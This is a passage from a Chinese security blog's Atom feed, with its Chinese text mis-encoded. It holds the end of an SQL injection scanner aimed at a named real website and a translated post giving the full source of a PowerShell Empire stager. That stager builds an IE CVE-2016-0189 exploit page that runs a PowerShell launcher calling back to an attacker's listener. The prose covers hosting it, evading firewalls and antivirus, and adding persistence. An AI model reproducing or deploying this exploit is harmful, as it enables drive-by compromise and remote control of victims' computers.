arg)</span>:</span></span><br><span class="line"><span class="keyword">if</span> service == <span class="string">'fingerprint.girl'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, arg</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></span><br><span class="line">payload = <span class="string">"/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"</span></span><br><span class="line">url = arg + payload</span><br><span class="line">code, head, res, errcode, _ = hackhttp.http(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">'81dc9bdb52d04dc20036dbd8313ed055'</span> <span class="keyword">in</span> res:</span><br><span class="line">security_hole(url)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">from</span> dummy <span class="keyword">import</span> *</span><br><span class="line">audit(assign(<span class="string">'fingerprint.girl'</span>,<span class="string">'http://www.jmsyzx.com/'</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯æƒ³é—®æˆ‘hackhttpæ˜¯ä¸ªä»€ä¹ˆåº“ï¼Œçœ‹<a href="http://doc.bugscan.net/" target="_blank" rel="noopener">æ–‡æ¡£</a>å»ã€‚</p><p>å¥½ï¼Œä»Šå¤©å¦¹å­å°±æ³¡åˆ°è¿™å„¿ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ€è¿‘å››å¶è‰åˆå¼€å§‹æ‹›æ”¶å®ä¹ äº†ï¼Œæ‰€ä»¥æŸä¸ªå¦¹å­å°±æŠ•äº†ç®€å†ã€‚ä¸ä¹…å››å¶è‰å‘æ¥ä¸€ä¸ªé¢˜ç›®è¦å¦¹å­å®Œæˆã€‚Soï¼Ÿè¿™æ„å‘³ç€ä»€ä¹ˆï¼Œè¿™æ„å‘³ç€ä¸€ä¸ªæ³¡å¦¹å­çš„å¥½æ—¶æœºæ¥äº†å•Šã€‚å“ˆå“ˆå“ˆâ€¦â€¦&lt;/p&gt;
&lt;p&gt;ä¸‹é¢å°±è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªé¢˜ç›®ï¼š&lt;/p&gt;
&lt;p&gt;æŸé€šç”¨å¹³å°è¢«æ›å‡ºæœ‰ä¸€å¤„é«˜å±æ³¨å…¥ï¼Œä»¥ä¸‹ä¸ºè¯¦æƒ…ï¼š&lt;/p&gt;
&lt;figur
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT</title>
    <link href="http://zer0yu.github.io/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/"/>
    <id>http://zer0yu.github.io/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/</id>
    <published>2017-01-22T03:21:47.000Z</published>
    <updated>2017-01-22T03:23:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    Powershell Empire æ˜¯æˆ‘ä»¬åœ¨æ¸—é€ç›®æ ‡ç”¨æˆ·æ—¶ä¸€ç›´éƒ½å¾ˆå–œæ¬¢çš„å·¥å…·ä¹‹ä¸€ï¼Œè™½ç„¶æˆ‘ä»¬é€šå¸¸éƒ½æ˜¯ç”¨Metaspolitå’ŒEmpireæ¥ä¸€èµ·å®Œæˆå·¥ä½œï¼Œä½¿æµè§ˆå™¨æ¼æ´å’Œç»éªŒç»“åˆåœ¨Empireä¸­ã€‚<br>åœ¨æœ€è¿‘çš„ä¸€æ¬¡æµ‹è¯•ä¸­æˆ‘ä»¬æ²¡æœ‰é€‰æ‹©å»ä½¿ç”¨MSFï¼Œç›¸åæˆ‘ä»¬å’Œä¸€ä¸ªæ–°çš„â€œç»éªŒä¸°å¯Œâ€çš„Empireä¸€èµ·åˆ©ç”¨CVE-2016-0189ï¼ˆä¹Ÿå°±æ˜¯vbscrupt_godmodeï¼‰å…¶æ”»å‡»ä½¿ç”¨IE9â€”11çš„ç”¨æˆ·ã€‚Empireæ˜¯è¿‘6ä¸ªæœˆæ¥æˆ‘ä»¬é¦–é€‰çš„ä½¿ç”¨å¹¶ä¸”æœ€è¿‘å¼€å§‹æ‰“é€ æ¼æ´å·¥å…·ç®±ã€‚å¦‚æœæˆåŠŸï¼Œpowershellå°†ä¼šç™»å½•å¹¶é€šè¿‡ä¸€ä¸ªä»£ç†é“¾æ¥åˆ°Empireã€‚é‡è¦çš„æ˜¯ç¡¬ç›˜ä¸Šä¸ä¼šç•™ä¸‹ä»»ä½•ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.common <span class="keyword">import</span> helpers</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stager</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mainMenu, params=[])</span>:</span></span><br><span class="line"></span><br><span class="line">        self.info = &#123;</span><br><span class="line">            <span class="string">'Name'</span>: <span class="string">'MS16-051 IE RCE'</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">'Author'</span>: [<span class="string">'www.cgsec.co.uk'</span>],</span><br><span class="line"></span><br><span class="line">            <span class="string">'Description'</span>: (<span class="string">'Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'</span>),</span><br><span class="line"></span><br><span class="line">            <span class="string">'Comments'</span>: [</span><br><span class="line">                <span class="string">'Target will have to open link with vulnerable version of IE.'</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># any options needed by the stager, settable during runtime</span></span><br><span class="line">        self.options = &#123;</span><br><span class="line">            <span class="comment"># format:</span></span><br><span class="line">            <span class="comment">#   value_name : &#123;description, required, default_value&#125;</span></span><br><span class="line">            <span class="string">'Listener'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Listener to generate stager for.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'StagerRetries'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Times for the stager to retry connecting.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'0'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'OutFile'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'File to output HTML to, otherwise displayed on the screen.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'Base64'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Switch. Base64 encode the powershell output.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'True'</span></span><br><span class="line">            &#125;,            </span><br><span class="line">            <span class="string">'UserAgent'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'User-agent string to use for the staging request (default, none, or other).'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'Proxy'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy to use for request (default, none, or other).'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'ProxyCreds'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># save off a copy of the mainMenu object to access external functionality</span></span><br><span class="line">        <span class="comment">#   like listeners/agent handlers/etc.</span></span><br><span class="line">        self.mainMenu = mainMenu</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">            <span class="comment"># parameter format is [Name, Value]</span></span><br><span class="line">            option, value = param</span><br><span class="line">            <span class="keyword">if</span> option <span class="keyword">in</span> self.options:</span><br><span class="line">                self.options[option][<span class="string">'Value'</span>] = value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># extract all of our options</span></span><br><span class="line">        listenerName = self.options[<span class="string">'Listener'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        base64 = self.options[<span class="string">'Base64'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        userAgent = self.options[<span class="string">'UserAgent'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        proxy = self.options[<span class="string">'Proxy'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        proxyCreds = self.options[<span class="string">'ProxyCreds'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        stagerRetries = self.options[<span class="string">'StagerRetries'</span>][<span class="string">'Value'</span>]</span><br><span class="line"></span><br><span class="line">        encode = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> base64.lower() == <span class="string">"true"</span>:</span><br><span class="line">            encode = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># generate the launcher code</span></span><br><span class="line">        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> launcher == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">print</span> helpers.color(<span class="string">"[!] Error in launcher command generation."</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">code =  <span class="string">"&lt;html&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;head&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;/head&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;body&gt;\n"</span></span><br><span class="line">code += <span class="string">"    &lt;script type=\"text/vbscript\"&gt;\n"</span></span><br><span class="line">code += <span class="string">"        Dim aw\n"</span></span><br><span class="line">code += <span class="string">"        Dim plunge(32)\n"</span></span><br><span class="line">code += <span class="string">"        Dim y(32)\n"</span></span><br><span class="line">code += <span class="string">"        prefix = \"%u4141%u4141\"\n"</span></span><br><span class="line">code += <span class="string">"        d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n"</span></span><br><span class="line">code += <span class="string">"        b = String(64000, \"D\")\n"</span></span><br><span class="line">code += <span class="string">"        c = d &amp; b\n"</span></span><br><span class="line">code += <span class="string">"        x = UnEscape(c)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Class ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"            Dim A()\n"</span></span><br><span class="line">code += <span class="string">"            Private Sub Class_Initialize\n"</span></span><br><span class="line">code += <span class="string">"                  ReDim Preserve A(1, 2000)\n"</span></span><br><span class="line">code += <span class="string">"            End Sub\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Public Sub Resize()\n"</span></span><br><span class="line">code += <span class="string">"                ReDim Preserve A(1, 1)\n"</span></span><br><span class="line">code += <span class="string">"            End Sub\n"</span></span><br><span class="line">code += <span class="string">"        End Class\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Class Dummy\n"</span></span><br><span class="line">code += <span class="string">"        End Class\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function getAddr (arg1, s)\n"</span></span><br><span class="line">code += <span class="string">"            aw = Null\n"</span></span><br><span class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            For i = 0 To 32\n"</span></span><br><span class="line">code += <span class="string">"                Set plunge(i) = s\n"</span></span><br><span class="line">code += <span class="string">"            Next\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Set aw.A(arg1, 2) = s\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Dim addr\n"</span></span><br><span class="line">code += <span class="string">"            Dim i\n"</span></span><br><span class="line">code += <span class="string">"            For i = 0 To 31\n"</span></span><br><span class="line">code += <span class="string">"                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n"</span></span><br><span class="line">code += <span class="string">"                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n"</span></span><br><span class="line">code += <span class="string">"                End If\n"</span></span><br><span class="line">code += <span class="string">"                y(i) = Null\n"</span></span><br><span class="line">code += <span class="string">"            Next\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            If addr = Null Then\n"</span></span><br><span class="line">code += <span class="string">"                document.location.href = document.location.href\n"</span></span><br><span class="line">code += <span class="string">"                Return\n"</span></span><br><span class="line">code += <span class="string">"            End If\n"</span></span><br><span class="line">code += <span class="string">"            getAddr = addr\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function leakMem (arg1, addr)\n"</span></span><br><span class="line">code += <span class="string">"            d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n"</span></span><br><span class="line">code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></span><br><span class="line">code += <span class="string">"            x = UnEscape(c)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            aw = Null\n"</span></span><br><span class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Dim o\n"</span></span><br><span class="line">code += <span class="string">"            o = aw.A(arg1, 2)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            leakMem = o\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Sub overwrite (arg1, addr)\n"</span></span><br><span class="line">code += <span class="string">"            d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n"</span></span><br><span class="line">code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></span><br><span class="line">code += <span class="string">"            x = UnEscape(c)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            aw = Null\n"</span></span><br><span class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            aw.A(arg1, 2) = CSng(0)\n"</span></span><br><span class="line">code += <span class="string">"        End Sub\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function exploit (arg1)\n"</span></span><br><span class="line">code += <span class="string">"            Dim addr\n"</span></span><br><span class="line">code += <span class="string">"            Dim csession\n"</span></span><br><span class="line">code += <span class="string">"            Dim olescript\n"</span></span><br><span class="line">code += <span class="string">"            Dim mem\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Set dm = New Dummy\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            addr = getAddr(arg1, dm)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            mem = leakMem(arg1, addr + 8)\n"</span></span><br><span class="line">code += <span class="string">"            csession = strToInt(Mid(mem, 3, 2))\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            mem = leakMem(arg1, csession + 4)\n"</span></span><br><span class="line">code += <span class="string">"            olescript = strToInt(Mid(mem, 1, 2))\n"</span></span><br><span class="line">code += <span class="string">"            overwrite arg1, olescript + &amp;H174\n"</span></span><br><span class="line">code += <span class="string">"    Set Object = CreateObject(\"Wscript.Shell\")\n"</span></span><br><span class="line">code +=<span class="string">"Object.run(\""</span></span><br><span class="line">code += launcher + <span class="string">"\")\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function triggerBug\n"</span></span><br><span class="line">code += <span class="string">"            aw.Resize()\n"</span></span><br><span class="line">code += <span class="string">"            Dim i\n"</span></span><br><span class="line">code += <span class="string">"            For i = 0 To 32\n"</span></span><br><span class="line">code += <span class="string">"                ' 24000x2 + 6 = 48006 bytes\n"</span></span><br><span class="line">code += <span class="string">"                y(i) = Mid(x, 1, 24000)\n"</span></span><br><span class="line">code += <span class="string">"            Next\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"    &lt;/script&gt;\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"    &lt;script type=\"text/javascript\"&gt;\n"</span></span><br><span class="line">code += <span class="string">"        function strToInt(s)\n"</span></span><br><span class="line">code += <span class="string">"        &#123;\n"</span></span><br><span class="line">code += <span class="string">"            return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n"</span></span><br><span class="line">code += <span class="string">"        &#125;\n"</span></span><br><span class="line">code += <span class="string">"        function intToStr(x)\n"</span></span><br><span class="line">code += <span class="string">"        &#123;\n"</span></span><br><span class="line">code += <span class="string">"            return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n"</span></span><br><span class="line">code += <span class="string">"        &#125;\n"</span></span><br><span class="line">code += <span class="string">"        var o;\n"</span></span><br><span class="line">code += <span class="string">"        o = &#123;\"valueOf\": function () &#123;\n"</span></span><br><span class="line">code += <span class="string">"                triggerBug();\n"</span></span><br><span class="line">code += <span class="string">"                return 1;\n"</span></span><br><span class="line">code += <span class="string">"            &#125;&#125;;\n"</span></span><br><span class="line">code += <span class="string">"        setTimeout(function() &#123;exploit(o);&#125;, 50);\n"</span></span><br><span class="line">code += <span class="string">"    &lt;/script&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;/body&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;/html&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><p>ms16.py</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥ä»<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="noopener">Github</a>è·å–Empire</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/1.png?resize=661%2C418&amp;ssl=1" alt="Empire Downloading"></p><p>ç°åœ¨æˆ‘ä»¬å·²ç»ä¸‹è½½äº†Empireï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å®‰è£…apache2ä»¥ä¾¿äºæˆ‘ä»¬æŠŠç´¢å¼•é¡µé¢ç›´æ¥æ”¾åˆ°/var/www/htmlè·¯å¾„ä¸‹ã€‚è¿™ä¸€æ­¥æ˜¯å¯é€‰çš„ï¼Œå› ä¸ºå¤§å¤šæ•°äººéƒ½æƒ³æ”¹å˜è¾“å‡ºä½ç½®ï¼Œæ¨¡ç³Šå®ƒæ¥é€ƒé¿æ€æ¯’å¼•æ“æˆ–è€…ç±»ä¼¼çš„äº§å“ã€‚</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/2.png?resize=661%2C418&amp;ssl=1" alt="Installing Apache2"><br>æ¥ä¸‹æ¥è¯¥æ·»åŠ æˆ‘ä»¬çš„æ–°è§„åˆ™äº†ã€‚è¿™éœ€è¦å°†è„šæœ¬æ”¾åœ¨/lib/stagersä¸‹å¹¶ä¸”è¿è¡ŒEmpireçš„install.shè„šæœ¬å»æ·»åŠ å¹¶è¿è¡Œå®ƒã€‚å¦‚æœä½ çš„è¿è¡Œåœ¨Ubuntuç¯å¢ƒä¸­ï¼Œä½ å¯èƒ½è¦åœ¨è¿è¡Œè¿™äº›è„šæœ¬ä¹‹å‰å»å®‰è£…pipã€‚</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/3.png?resize=661%2C418&amp;ssl=1" alt="Empire Installation"><br>ç°åœ¨æˆ‘ä»¬å·²ç»å‡†å¤‡å¥½å¹¶è¦ç¬¬ä¸€æ¬¡å»å¯åŠ¨Empireäº†ã€‚å¦‚æœä¸€åˆ‡éƒ½é¡ºåˆ©çš„è¯æˆ‘ä»¬åº”è¯¥å¯ä»¥å»ä½¿ç”¨æˆ‘ä»¬æ·»åŠ çš„ms16è„šæœ¬ã€è®¾ç½®æˆ‘ä»¬çš„è¾“å‡ºæ–‡ä»¶åˆ°/var/www/html/index.htmlå¹¶ä¸”æ”¾ç½®ç›´æ¥ç›®æ ‡åˆ°å…¶ä¸­ã€‚æ›´é«˜çº§çš„ç”¨æˆ·å¯èƒ½æƒ³è¦å»è®¾ç½®ä¸€äº›ç¨å¾®å¤æ‚çš„åˆ°æœåŠ¡ä¸­æ¥åˆ©ç”¨ä¸åŒå®¢æˆ·æˆ–ä¸åŒçš„å‘é‡æ¥æ··æ·†è§†å¬ï¼Œè¿™äº›å°±å·²ç»è¶…å‡ºæœ¬æ–‡è¦æè¿°çš„èŒƒå›´äº†ã€‚</p><p>æˆ‘ä¸ªäººæ›´åå‘äºè®¾ç½®443ç«¯å£çš„ç›‘å¬ä»¥æœŸbypassä¸€äº›é˜²ç«å¢™å¹¶é€ƒé¿ä¸€äº›æ£€æµ‹æœºåˆ¶ã€‚</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/4.png?resize=925%2C546&amp;ssl=1" alt="Empire Listener"><br>ç°åœ¨å»ç”Ÿæˆæˆ‘ä»¬çš„æ¶æ„HTML</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/5.png?resize=925%2C546&amp;ssl=1" alt="Stager Generation"></p><p>ç°åœ¨å½“ä½ çš„æœåŠ¡è¢«æŸä¸ªä½¿ç”¨å¸¦æœ‰ç›¸å…³æ¼æ´æµè§ˆå™¨çš„ç”¨æˆ·æµè§ˆçš„æ—¶å€™ï¼Œè¿™ä¸ªæ”»å‡»è½½è·å°†è¢«è§¦å‘åŒæ—¶ä½ å°†çœ‹åˆ°ä¸€ä¸ªæ–°çš„ä»£ç†åœ¨Empireä¸­ã€‚ä½¿ç”¨æŒä¹…æ€§æ¨¡å—åˆ›å»ºä»»åŠ¡é€šå¸¸æ˜¯ä¸ªå¥½æ³¨æ„ï¼Œç›¸ä¼¼çš„ä¹Ÿå¯ä»¥ç¡®ä¿ä½ ä¸å› ä¸ºé‡æ–°å¯åŠ¨è€Œä¸¢å¤±æƒé™ã€‚è¿™äº›å¯ä»¥é€šè¿‡è®¾ç½®è‡ªåŠ¨è¿è¡Œçš„ä»£ç†ä»è€Œè®¾ç½®ä¸ºè‡ªåŠ¨è¿è¡Œä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯è¿æ¥ã€‚</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/7.png?resize=925%2C546&amp;ssl=1" alt="New Agent"></p>]]></content>
    
    <summary type="html">
    
      
      
